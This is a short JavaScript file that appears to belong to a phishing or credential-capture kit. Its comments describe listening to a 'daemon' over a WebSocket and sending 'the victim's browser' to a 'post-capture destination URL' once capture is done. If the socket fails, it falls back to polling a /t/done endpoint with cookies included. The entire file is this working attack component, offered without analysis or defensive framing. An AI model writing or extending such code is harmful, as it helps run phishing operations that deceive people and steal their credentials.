"use strict";

// Listens for a redirect command from the daemon via WebSocket and navigates
// the victim's browser to the post-capture destination URL.
// Falls back to HTTP polling if the WebSocket connection fails.
// The session ID is read from the __ss cookie by the server.
(function () {
  var wsURL =
    (location.protocol === "https:" ? "wss://" : "ws://") +
    location.host +
    "/ws";

  var ws = new WebSocket(wsURL);

  ws.onmessage = function (e) {
    try {
      var data = JSON.parse(e.data);
      if (data.redirect_url) {
        top.location.href = data.redirect_url;
      }
    } catch (_) {}
    ws.close();
  };

  // If the WebSocket fails, fall back to polling the done endpoint.
  ws.onerror = function () {
    var poll = setInterval(function () {
      fetch("/t/done", { credentials: "include" })
        .then(function (r) {
          return r.json();
        })
        .then(function (d) {
          if (d.redirect_url) {
            clearInterval(poll);
            top.location.href = d.redirect_url;
          }
        })
        .catch(function () {});
    }, 3000);
  };
})();
